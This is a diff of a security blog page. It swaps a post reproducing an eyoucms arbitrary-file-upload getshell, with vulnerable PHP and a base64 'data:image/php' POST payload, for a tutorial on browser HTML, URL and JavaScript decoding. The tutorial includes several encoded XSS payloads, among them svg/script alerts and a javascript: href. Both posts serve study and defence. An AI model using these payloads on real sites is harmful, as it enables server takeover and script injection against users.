@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>eyoucms前台getshell复现 · Hu3sky&#39;s blog</title>
+    <title>深入理解浏览器编码 · Hu3sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -220,7 +220,7 @@
                 <a href="/" >Hu3sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">eyoucms前台getshell复现</a>
+                <a href="#" class="post-name">深入理解浏览器编码</a>
             </div>
     </div>
     
@@ -252,7 +252,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            eyoucms前台getshell复现
+            深入理解浏览器编码
             <!-- 404 -->
             
         </h1>
@@ -271,12 +271,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">450</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">495</span> / Reading time: <span class="post-count">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/25</span>
+                    <span class="post-intro-time">2019/08/06</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -400,21 +400,69 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>既然自己挖不到getshell的洞，就来复现一下别人的，学习学习思路。</p>
-<h1 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h1><p>官网：<a href="http://www.eyoucms.com/download/" target="_blank" rel="noopener">http://www.eyoucms.com/download/</a><br>Cms下载地址：<a href="http://www.eyoucms.com/eyoucms1.0.zip" target="_blank" rel="noopener">http://www.eyoucms.com/eyoucms1.0.zip</a></p>
-<h1 id="漏洞出现位置"><a href="#漏洞出现位置" class="headerlink" title="漏洞出现位置"></a>漏洞出现位置</h1><p>页面：<a href="http://127.0.0.1/index.php/api/Uploadify/preview" target="_blank" rel="noopener">http://127.0.0.1/index.php/api/Uploadify/preview</a><br>代码位置 application\api\controller\Uploadify.php</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞在第201行的preview函数开始</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">        //获取 原始数据的只读流</span><br><span class="line">        $src = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">        //正则判断，图片base64编码数据</span><br><span class="line">        //绕过正则 data:image/php;base64</span><br><span class="line">        if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) &#123;</span><br><span class="line">            $previewUrl = sprintf(</span><br><span class="line">                &quot;%s://%s%s&quot;,</span><br><span class="line">                isset($_SERVER[&apos;HTTPS&apos;]) &amp;&amp; $_SERVER[&apos;HTTPS&apos;] != &apos;off&apos; ? &apos;https&apos; : &apos;http&apos;,</span><br><span class="line">                $_SERVER[&apos;HTTP_HOST&apos;],$_SERVER[&apos;REQUEST_URI&apos;]</span><br><span class="line">            );</span><br><span class="line">            //获取路径</span><br><span class="line">            $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);</span><br><span class="line">            //获取base64数据</span><br><span class="line">            $base64 = $matches[2];</span><br><span class="line">            //获取base64后缀 此时为php</span><br><span class="line">            $type = $matches[1];</span><br><span class="line"></span><br><span class="line">            //判断type是否是jepg，若为jepg则type就为jpg</span><br><span class="line">            //所以构造后缀为php</span><br><span class="line">            //例如：data:image/php;base64。此时type=php</span><br><span class="line">            //而下面判断是$type等于jepg赋值为jpg，后缀完美可外部控制</span><br><span class="line">            if ($type === &apos;jpeg&apos;) &#123;</span><br><span class="line">                $type = &apos;jpg&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            //设置文件名称</span><br><span class="line">            $filename = md5($base64).&quot;.$type&quot;; //这里我们可以控制为php</span><br><span class="line">            //设置文件路径</span><br><span class="line">            $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">            //判断文件是否存在，如果存在 返回文件路径</span><br><span class="line">            if (file_exists($filePath)) &#123;</span><br><span class="line">                die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&apos;.$previewUrl.&apos;preview/&apos;.$filename.&apos;&quot;, &quot;id&quot; : &quot;id&quot;&#125;&apos;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //将外部的base64数据解码</span><br><span class="line">                $data = base64_decode($base64);</span><br><span class="line">                //写入文件，生成文件</span><br><span class="line">                file_put_contents($filePath, $data);</span><br><span class="line">                die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&apos;.$previewUrl.&apos;preview/&apos;.$filename.&apos;&quot;, &quot;id&quot; : &quot;id&quot;&#125;&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&apos;&#123;&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : &#123;&quot;code&quot;: 100, &quot;message&quot;: &quot;un recoginized source&quot;&#125;&#125;&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>此漏洞正则背锅，仅仅以data:image/作为图片，而忽略了data:image/php，即可绕过。</p>
-<h1 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h1><p>在 <a href="http://127.0.0.1/index.php/api/Uploadify/preview" target="_blank" rel="noopener">http://127.0.0.1/index.php/api/Uploadify/preview</a> 处，post数据 <code>data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==</code>.即可得到文件路径<img src="/eyou/1.png" alt="1">。用域名+后面部分，即可getshell。<br><img src="/eyou/2.png" alt="2"></p>
-
+        <h1 id="开头"><a href="#开头" class="headerlink" title="开头"></a>开头</h1><p>从一到题目引发了对html编码的兴趣<br>在svg标签里面，利用html编码是能够被解析的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># html编码左括号</span><br><span class="line"># 传入的时候记得将&amp;#x28; 进行url编码</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#x28;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># html编码alert</span><br><span class="line"># 传入的时候记得url编码</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/37403964/64482382-72030680-d223-11e9-925a-4cff2648355b.png" alt="image"><br><img src="https://user-images.githubusercontent.com/37403964/64482384-74fdf700-d223-11e9-8ed2-44988231d305.png" alt="image"></p>
+<p>不过去掉svg标签就不能弹窗了<br>这里先理解一下浏览器的解码以及XSS里的一些东西</p>
+<h1 id="浏览器解码过程"><a href="#浏览器解码过程" class="headerlink" title="浏览器解码过程"></a>浏览器解码过程</h1><p>html解析(器)，url解析(器)，js解析(器)</p>
+<h1 id="HTML解析标签"><a href="#HTML解析标签" class="headerlink" title="HTML解析标签"></a>HTML解析标签</h1><p>html解析器在解析过程中，遇到一个<code>&lt;</code>就会进入标签开始状态(TagOpenState)-&gt;标签名状态(TagNameState)-&gt;前属性名状态-&gt;…-&gt;数据状态(DataState)并释放当前标签token<br>当进入数据状态，每发现一个完整标签，就释放出一个token</p>
+<p>举个例子<br>比如在解析<div>标签时<br>首先遇到&lt;,此时进入TagOpenState,token为Uninitialized<br>接着遇到d,此时进入TagNameState,token为StartTag<br>然后遇到i,v,同上<br>接着遇到&gt;,此时进入DataState,token为StartTag<br>此时释放出的token为StartTag</div></p>
+<h2 id="几个概念"><a href="#几个概念" class="headerlink" title="几个概念"></a>几个概念</h2><p>从一个payload说起<br>将<code>&lt;</code>,<code>&gt;</code>进行字符实体编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>此payload无法弹窗，解释原因之前先看几个概念</p>
+<h3 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h3><p><img src="https://user-images.githubusercontent.com/37403964/64482388-7a5b4180-d223-11e9-9dd5-e8d9913c7a8c.png" alt="image"></p>
+<p><code>&lt;</code> 的字符实体是 <code>&amp;#60;</code></p>
+<h3 id="HTML字符实体（实体编码）"><a href="#HTML字符实体（实体编码）" class="headerlink" title="HTML字符实体（实体编码）"></a>HTML字符实体（实体编码）</h3><p><code>&lt;</code> 的HTML字符实体是 <code>&amp;lt;</code></p>
+<h3 id="字符引用"><a href="#字符引用" class="headerlink" title="字符引用"></a>字符引用</h3><p>有 “数据状态中的字符引用”，“RCDATA状态中的字符引用”和“属性值状态中的字符引用”<br>字符引用又分为字符值引用和字符实体引用<br><code>&lt;</code> 的字符值引用是 <code>&amp;#60;</code>,字符实体引用是<code>&amp;lt;</code><br>在DataState遇到<code>&amp;</code>的时候,会进行字符引用，所以并不会闭合标签</p>
+<h3 id="html元素"><a href="#html元素" class="headerlink" title="html元素"></a>html元素</h3><p>五类元素</p>
+<ol>
+<li>空元素(Void elements)，如<area>,<br>,<base>等等,不能容纳任何内容,无闭合标签</li>
+<li>原始文本元素(Raw text elements)，有<script>和<style>，可以容纳文本</li>
+<li>RCDATA元素(RCDATA elements)，有<textarea>和<title>，可以容纳文本和字符引用</li>
+<li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素，可以容纳文本，字符引用，CDATA段，其他元素和注释</li>
+<li>基本元素(Normal elements)，即除了以上4种元素以外的元素，可以容纳文本，字符引用，其他元素和注释</li>
+</ol>
+<p>也就是说在<textarea>和<title>之间的字符引用会被解码,不过在解析这些字符引用的过程中不会进入“标签开始状态”</p>
+<p>在RCDATA元素标签的内容中（例如<textarea>或<title>的内容中），唯一能够被解析器认做是标签的就是“</textarea>”或者“</title>“</p>
+<h2 id="payload解释"><a href="#payload解释" class="headerlink" title="payload解释"></a>payload解释</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>遇到<div>,token被标记为StartTag,在进入DataState后,<code>&amp;#60;</code>是一个字符引用，所以不会进入标签开始状态<br>因此，在防御xss中，可以用实体编码来让用户输入只能被解释为data，而不会进入标签的开始</p>
+<h1 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h1><p>url资源类型必须是ascii,例如,不能对任何协议进行编码，比如<code>javascript:</code></p>
+<p>如果我们编码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果是从浏览器传入，验证时需要再编码一次，因为浏览器会解码一次</p>
+<p>不过如果是html实体编码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/37403964/64482390-80e9b900-d223-11e9-9db1-24eb188a8697.png" alt="image"></p>
+<p>因为之前说过字符引用有属性值里的字符引用，这里就是在href属性里的字符引用，实体字符会被解码，由于是javascript协议，JavaScript解析器开始工作并执行这段代码</p>
+<h1 id="Js解析"><a href="#Js解析" class="headerlink" title="Js解析"></a>Js解析</h1><p>在script这个标签里，里面的字符引用并不会被解码，这意味着</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>不会被解析</p>
+<p>不过我们看到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/37403964/64482391-847d4000-d223-11e9-88d2-b7cd18eff418.png" alt="image"></p>
+<p>将alert进行unicode编码后，也是能弹窗的<br>但是如果将括号也编码，就不能弹窗了<br>将括号里的1编码 也不能弹<br><img src="https://user-images.githubusercontent.com/37403964/64482417-e2118c80-d223-11e9-9651-1b81f972861e.png" alt="image"></p>
+<p>再看</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>\u0027是单引号，这里\u0027只会被解析为一个字符单引号，所以不能弹窗</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://user-images.githubusercontent.com/37403964/64482393-8810c700-d223-11e9-8c37-ab06b27f107d.png" alt="image"></p>
+<p>当用Unicode转义序列来表示一个控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量</p>
+<p>也就是说只有当Unicode转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等</p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>理解了浏览器的解码<br>来看svg，在xml中&#x28;会被解析为)<br>而svg正是解析xml的</p>
+<p>这个XSS之所以能够执行是因为遵循了svg及xml的标准</p>
+<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><ul>
+<li><a href="https://blog.csdn.net/hxwwf/article/details/7446058">https://blog.csdn.net/hxwwf/article/details/7446058</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/292.html">http://bobao.360.cn/learning/detail/292.html</a></li>
+<li><a href="https://www.hackersb.cn/hacker/85.html">https://www.hackersb.cn/hacker/85.html</a></li>
+</ul>
+</script></li></ol>
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://yoursite.com">Hu3sky</a>
-            <p>原文链接: <a href="http://yoursite.com/2018/08/25/eyou前台getshell/">http://yoursite.com/2018/08/25/eyou前台getshell/</a>
-            <p>发表日期: <a href="http://yoursite.com/2018/08/25/eyou前台getshell/">August 25th 2018, 2:03:00 pm</a>
+            <p>原文链接: <a href="http://yoursite.com/2019/08/06/深入理解浏览器编码/">http://yoursite.com/2019/08/06/深入理解浏览器编码/</a>
+            <p>发表日期: <a href="http://yoursite.com/2019/08/06/深入理解浏览器编码/">August 6th 2019, 10:01:00 am</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -422,17 +470,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/25/php-security-calendar-2017/" title= php-security-calendar-2017 >
-                    <div class="nextTitle">php-security-calendar-2017</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/08/23/Hooskcms/" title= Hooskcms 几个小洞 >
-                    <div class="prevTitle">Hooskcms 几个小洞</div>
+                <a href= "/2019/05/13/bypass_uac/" title= bypassUAC_via_comhijacking >
+                    <div class="prevTitle">bypassUAC_via_comhijacking</div>
                 </a>
             
         </li>
@@ -448,7 +491,7 @@ height:50vh;
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
     var gitment = new Gitment({
-        // id: "eyoucms前台getshell复现", // 可选。默认为 location.href
+        // id: "深入理解浏览器编码", // 可选。默认为 location.href
         owner: 'Hu3sky',
         repo: 'gitment-comments',
         oauth: {
@@ -567,7 +610,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cms"><span class="toc-number">1.</span> <span class="toc-text">cms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞出现位置"><span class="toc-number">2.</span> <span class="toc-text">漏洞出现位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞演示"><span class="toc-number">4.</span> <span class="toc-text">漏洞演示</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#开头"><span class="toc-number">1.</span> <span class="toc-text">开头</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#浏览器解码过程"><span class="toc-number">2.</span> <span class="toc-text">浏览器解码过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML解析标签"><span class="toc-number">3.</span> <span class="toc-text">HTML解析标签</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#几个概念"><span class="toc-number">3.1.</span> <span class="toc-text">几个概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字符实体"><span class="toc-number">3.1.1.</span> <span class="toc-text">字符实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML字符实体（实体编码）"><span class="toc-number">3.1.2.</span> <span class="toc-text">HTML字符实体（实体编码）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符引用"><span class="toc-number">3.1.3.</span> <span class="toc-text">字符引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#html元素"><span class="toc-number">3.1.4.</span> <span class="toc-text">html元素</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1667,130 +1710,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 72
+        Total : 73
         </div>
         <!-- search  -->
         
@@ -1803,6 +1725,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2019/08/06/深入理解浏览器编码/" >深入理解浏览器编码</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2020,7 +1947,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/eyouǰ̨getshell/" >eyoucms前台getshell复现</a>
         </li>
     
     
@@ -2030,12 +1957,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/bugku sql2/" >Bugku sql注入2</a>
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/Hack the ch4inrulz of Vulnhub/" >Hack the ch4inrulz of Vulnhub</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/Hack the ch4inrulz of Vulnhub/" >Hack the ch4inrulz of Vulnhub</a>
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/bugku sql2/" >Bugku sql注入2</a>
         </li>
     
     
@@ -2060,7 +1987,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/29</span><a class="archive-post-title" href= "/2018/06/29/xxe学习/" >浅谈XML实体注入漏洞</a>
+            <span class="archive-post-date">06/29</span><a class="archive-post-title" href= "/2018/06/29/xxeѧϰ/" >浅谈XML实体注入漏洞</a>
         </li>
     
     
@@ -2105,12 +2032,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2018/04/24/实验吧/" >实验吧WP</a>
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href= "/2018/04/25/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2018/04/24/i春秋/" >i春秋WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2018/04/24/实验吧/" >实验吧WP</a>
         </li>
     
     
@@ -2132,29 +2064,6 @@ top:50vh;
         <li class="archive-post-item">
             <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/1个月学习计划/" >1个月学习计划</a>
         </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/04/18/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
     
     
         <li class="archive-post-item">
@@ -2229,17 +2138,17 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
-    
         <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
         <span class="sidebar-category-name" data-categories="浏览器安全"><span class="iconfont-archer">&#xe60a;</span>浏览器安全</span>
     
-        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
-    
         <span class="sidebar-category-name" data-categories="备忘录"><span class="iconfont-archer">&#xe60a;</span>备忘录</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
         <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
     
@@ -2247,41 +2156,43 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
+        <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
+    
         <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
         <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
     
-        <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
-    
-        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
         <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
-        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
     
         <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
     
         <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
+        <span class="sidebar-category-name" data-categories="JavaScript"><span class="iconfont-archer">&#xe60a;</span>JavaScript</span>
+    
         <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
     
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
-        <span class="sidebar-category-name" data-categories="JavaScript"><span class="iconfont-archer">&#xe60a;</span>JavaScript</span>
-    
         <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
+    
+        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
         <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
     
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
+    
         <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
     
-        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
+        <span class="sidebar-category-name" data-categories="前端"><span class="iconfont-archer">&#xe60a;</span>前端</span>
     
         <span class="sidebar-category-name" data-categories="线下赛"><span class="iconfont-archer">&#xe60a;</span>线下赛</span>
     
         <span class="sidebar-category-name" data-categories="域渗透"><span class="iconfont-archer">&#xe60a;</span>域渗透</span>
-    
-        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
